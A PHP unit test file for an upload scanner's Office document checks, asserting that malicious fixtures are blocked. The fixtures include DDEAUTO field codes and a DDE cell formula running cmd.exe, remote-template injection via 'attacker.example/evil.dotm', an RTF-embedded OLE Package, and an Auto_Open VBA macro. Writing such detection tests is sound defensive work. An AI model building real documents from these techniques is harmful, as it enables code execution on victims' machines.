<?php

namespace Abdian\UploadGuard\Tests\Unit;

use Abdian\UploadGuard\OfficeScanner;
use Abdian\UploadGuard\Tests\Support\Fixtures;
use Abdian\UploadGuard\Tests\TestCase;

class OfficeScannerTest extends TestCase
{
    private function scan(string $bytes, string $name = 'doc.docx', ?OfficeScanner $scanner = null): array
    {
        $path = $this->scratchPath($name);
        Fixtures::writeTo($path, $bytes);

        return ($scanner ?? new OfficeScanner())->scan($path);
    }

    public function test_benign_docx_passes(): void
    {
        $this->assertTrue($this->scan(Fixtures::docx())['safe']);
    }

    public function test_ooxml_macro_blocked(): void
    {
        $result = $this->scan(Fixtures::docxWithMacro(), 'm.docx');
        $this->assertFalse($result['safe']);
        $this->assertTrue($result['has_macros']);
    }

    public function test_lowercase_content_types_still_scanned(): void
    {
        $result = $this->scan(Fixtures::docxLowercaseContentTypes(), 'lc.docx');
        $this->assertFalse($result['safe'], 'lowercase [content_types].xml must still be located');
        $this->assertTrue($result['has_macros']);
    }

    public function test_legacy_ole_macro_blocked(): void
    {
        $result = $this->scan(Fixtures::legacyOleMacroDoc(), 'legacy.doc');
        $this->assertFalse($result['safe']);
        $this->assertTrue($result['has_macros']);
    }

    public function test_legacy_ole_benign_passes(): void
    {
        $this->assertTrue($this->scan(Fixtures::legacyOleBenign(), 'plain.doc')['safe']);
    }

    public function test_allow_macros_is_honored_over_config(): void
    {
        config(['safeguard.office_scanning.block_macros' => true]);
        $scanner = (new OfficeScanner())->allowMacros();
        $result = $this->scan(Fixtures::docxWithMacro(), 'm.docx', $scanner);
        $this->assertTrue($result['safe'], 'allowMacros() must not be overwritten by config');
        $this->assertTrue($result['has_macros']);
    }

    /**
     * DDEAUTO field code in word/document.xml runs an external command at open
     * time with NO vbaProject.bin/ActiveX. Must be blocked under macro blocking.
     */
    public function test_ooxml_dde_field_code_blocked(): void
    {
        $bytes = Fixtures::zip([
            '[Content_Types].xml' => '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
                . '<Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>',
            '_rels/.rels' => '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
                . '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/></Relationships>',
            'word/document.xml' => '<?xml version="1.0"?><w:document xmlns:w="x"><w:body>'
                . '<w:p><w:fldSimple w:instr=" DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe &quot;/c calc.exe&quot; "><w:r><w:t>x</w:t></w:r></w:fldSimple></w:p>'
                . '</w:body></w:document>',
        ]);

        $result = $this->scan($bytes, 'dde.docx');
        $this->assertFalse($result['safe'], 'DDEAUTO field code must be blocked');
        $this->assertTrue($result['has_macros']);
    }

    /** DDE via <w:instrText> in a header part must also be caught. */
    public function test_ooxml_dde_in_header_instrtext_blocked(): void
    {
        $bytes = Fixtures::zip([
            '[Content_Types].xml' => '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
                . '<Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>',
            'word/document.xml' => '<?xml version="1.0"?><w:document xmlns:w="x"><w:body><w:p/></w:body></w:document>',
            'word/header1.xml' => '<?xml version="1.0"?><w:hdr xmlns:w="x"><w:p><w:r>'
                . '<w:instrText> DDE cmd "/c calc" </w:instrText></w:r></w:p></w:hdr>',
        ]);

        $result = $this->scan($bytes, 'ddehdr.docx');
        $this->assertFalse($result['safe'], 'DDE in header instrText must be blocked');
        $this->assertTrue($result['has_macros']);
    }

    /**
     * attachedTemplate relationship with TargetMode="External" pulls a remote
     * .dotm at open time (remote-template injection). Must be blocked.
     */
    public function test_ooxml_external_attached_template_blocked(): void
    {
        $bytes = Fixtures::zip([
            '[Content_Types].xml' => '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
                . '<Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>',
            '_rels/.rels' => '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
                . '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/></Relationships>',
            'word/document.xml' => '<?xml version="1.0"?><w:document xmlns:w="x"><w:body><w:p/></w:body></w:document>',
            'word/_rels/document.xml.rels' => '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
                . '<Relationship Id="rId99" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
                . 'Target="http://attacker.example/evil.dotm" TargetMode="External"/></Relationships>',
        ]);

        $result = $this->scan($bytes, 'tpl.docx');
        $this->assertFalse($result['safe'], 'external attachedTemplate must be blocked');
        $this->assertTrue($result['has_macros']);
    }

    /** A benign external relationship (hyperlink) must NOT trip the detector. */
    public function test_ooxml_external_hyperlink_still_passes(): void
    {
        $bytes = Fixtures::zip([
            '[Content_Types].xml' => '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
                . '<Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>',
            'word/document.xml' => '<?xml version="1.0"?><w:document xmlns:w="x"><w:body><w:p/></w:body></w:document>',
            'word/_rels/document.xml.rels' => '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
                . '<Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" '
                . 'Target="https://example.com/" TargetMode="External"/></Relationships>',
        ]);

        $this->assertTrue($this->scan($bytes, 'link.docx')['safe'], 'benign external hyperlink must pass');
    }

    /**
     * DDE field codes are evaluated in any document story part, not just
     * word/document.xml. A DDEAUTO inside word/footnotes.xml must be caught.
     */
    public function test_ooxml_dde_in_footnotes_blocked(): void
    {
        $bytes = Fixtures::zip([
            '[Content_Types].xml' => '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
                . '<Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>',
            '_rels/.rels' => '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
                . '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/></Relationships>',
            'word/document.xml' => '<?xml version="1.0"?><w:document xmlns:w="x"><w:body><w:p/></w:body></w:document>',
            'word/footnotes.xml' => '<?xml version="1.0"?><w:footnotes xmlns:w="x"><w:footnote><w:p><w:r>'
                . '<w:instrText> DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe &quot;/c calc.exe&quot; </w:instrText></w:r></w:p></w:footnote></w:footnotes>',
        ]);

        $result = $this->scan($bytes, 'fn.docx');
        $this->assertFalse($result['safe'], 'DDEAUTO in word/footnotes.xml must be blocked');
        $this->assertTrue($result['has_macros']);
    }

    /**
     * The main document part can be renamed (resolved via the officeDocument
     * relationship). A DDEAUTO field in a renamed main part must still be
     * caught — a fixed part-name allowlist is bypassable.
     */
    public function test_ooxml_dde_in_renamed_main_part_blocked(): void
    {
        $bytes = Fixtures::zip([
            '[Content_Types].xml' => '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
                . '<Override PartName="/word/main.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>',
            '_rels/.rels' => '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
                . '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/main.xml"/></Relationships>',
            'word/main.xml' => '<?xml version="1.0"?><w:document xmlns:w="x"><w:body><w:p>'
                . '<w:fldSimple w:instr=" DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe &quot;/c calc.exe&quot; "><w:r><w:t>x</w:t></w:r></w:fldSimple>'
                . '</w:p></w:body></w:document>',
        ]);

        $result = $this->scan($bytes, 'renamed.docx');
        $this->assertFalse($result['safe'], 'DDEAUTO in a renamed main part must be blocked');
        $this->assertTrue($result['has_macros']);
    }

    /**
     * A structurally valid .xlsx carrying a DDE call as a cell formula
     * (<f>=cmd|'/c calc.exe'!A1</f>) in xl/worksheets/sheet1.xml runs an
     * external command at open time with NO VBA. Must be blocked: DDE detection
     * may not be confined to word/ parts.
     */
    public function test_ooxml_xlsx_dde_formula_blocked(): void
    {
        $bytes = Fixtures::zip([
            '[Content_Types].xml' => '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
                . '<Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/></Types>',
            '_rels/.rels' => '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
                . '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/></Relationships>',
            'xl/workbook.xml' => '<?xml version="1.0"?><workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheets><sheet name="S" sheetId="1" r:id="rId1"/></sheets></workbook>',
            'xl/worksheets/sheet1.xml' => '<?xml version="1.0"?><worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">'
                . '<sheetData><row r="1"><c r="A1" t="str"><f>=cmd|&apos;/c calc.exe&apos;!A1</f><v>0</v></c></row></sheetData></worksheet>',
        ]);

        $result = $this->scan($bytes, 'dde.xlsx');
        $this->assertFalse($result['safe'], 'DDE spreadsheet formula must be blocked');
        $this->assertTrue($result['has_macros']);
    }

    /**
     * The main document part may be renamed to a part OUTSIDE word/ (resolved
     * via the officeDocument relationship), e.g. story/main.xml. A DDEAUTO
     * field there must still be caught — scoping detection to the word/ prefix
     * is an allowlist bypass.
     */
    public function test_ooxml_dde_in_non_word_prefixed_main_part_blocked(): void
    {
        $bytes = Fixtures::zip([
            '[Content_Types].xml' => '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
                . '<Override PartName="/story/main.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>',
            '_rels/.rels' => '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
                . '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="story/main.xml"/></Relationships>',
            'story/main.xml' => '<?xml version="1.0"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p>'
                . '<w:r><w:fldChar w:fldCharType="begin"/></w:r>'
                . '<w:r><w:instrText xml:space="preserve"> DDEAUTO c:\\\\Windows\\\\System32\\\\cmd.exe &quot;/c calc.exe&quot; </w:instrText></w:r>'
                . '<w:r><w:fldChar w:fldCharType="end"/></w:r></w:p></w:body></w:document>',
        ]);

        $result = $this->scan($bytes, 'renamed.docx');
        $this->assertFalse($result['safe'], 'DDEAUTO in a non-word-prefixed main part must be blocked');
        $this->assertTrue($result['has_macros']);
    }

    /**
     * A benign .xlsx with ordinary numeric/SUM formulas must NOT trip the DDE
     * formula detector.
     */
    public function test_ooxml_benign_xlsx_formula_passes(): void
    {
        $bytes = Fixtures::zip([
            '[Content_Types].xml' => '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
                . '<Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/></Types>',
            '_rels/.rels' => '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
                . '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/></Relationships>',
            'xl/workbook.xml' => '<?xml version="1.0"?><workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheets><sheet name="S" sheetId="1" r:id="rId1"/></sheets></workbook>',
            'xl/worksheets/sheet1.xml' => '<?xml version="1.0"?><worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">'
                . '<sheetData><row r="1"><c r="A1"><f>SUM(B1:B10)</f><v>55</v></c><c r="A2"><f>A1*2</f><v>110</v></c></row></sheetData></worksheet>',
        ]);

        $this->assertTrue($this->scan($bytes, 'sum.xlsx')['safe'], 'benign SUM formula must pass');
    }

    /**
     * A legacy CFB whose FAT/DIFAT chain is truncated cannot be fully
     * enumerated, so a later macro storage could be hidden. Fail closed.
     */
    public function test_legacy_truncated_difat_fails_closed(): void
    {
        // Start from a valid benign CFB then truncate it after the FAT sector
        // so the FAT builds (parse is "valid") but the directory sector the FAT
        // chain points at is gone — enumeration is therefore incomplete.
        $valid = Fixtures::legacyOleBenign();
        $truncated = substr($valid, 0, 1024); // header (512) + FAT (512), dir sector missing

        $result = $this->scan($truncated, 'trunc.doc');
        $this->assertFalse($result['safe'], 'truncated CFB must fail closed under macro blocking');
    }

    public function test_rtf_with_embedded_ole_object_is_blocked(): void
    {
        // RTF carrying an embedded OLE "Package" object (the classic
        // double-click-to-run-cmd.exe phishing technique) as hex \objdata.
        $rtf = '{\rtf1\ansi{\object\objemb{\*\objclass Package}{\*\objdata 01050000020000000c000000}}}';
        $path = $this->scratchPath('evil.rtf');
        Fixtures::writeTo($path, $rtf);
        $scanner = new OfficeScanner();
        $this->assertTrue($scanner->isOfficeDocument($path), 'RTF must be routed to the office scanner');
        $this->assertFalse($scanner->scan($path)['safe'], 'RTF embedded OLE object must be blocked');
    }

    public function test_benign_rtf_passes(): void
    {
        $this->assertTrue($this->scan('{\rtf1\ansi Just text, no objects.\par}', 'ok.rtf')['safe']);
    }

    public function test_legacy_macro_without_ole_subtype_is_routed_and_blocked(): void
    {
        // A CFB carrying a VBA macro storage but NO document-type stream (no
        // Workbook/WordDocument), so detectOleSubtype() is null — it must still
        // be routed to the scanner and flagged, not skipped.
        $cfb = \Abdian\UploadGuard\Tests\Support\CompoundFileBuilder::build([
            'Macros/VBA/_VBA_PROJECT' => "Attribute VB_Name=\"M\"\nSub Auto_Open()\nShell \"calc\"\nEnd Sub\n",
        ]);
        $path = $this->scratchPath('nosub.xls');
        Fixtures::writeTo($path, $cfb);
        $scanner = new OfficeScanner();
        $this->assertTrue($scanner->isOfficeDocument($path), 'macro-bearing CFB must be recognized as an office document');
        $this->assertFalse($scanner->scan($path)['safe'], 'macro without an OLE subtype must be blocked');
    }
}
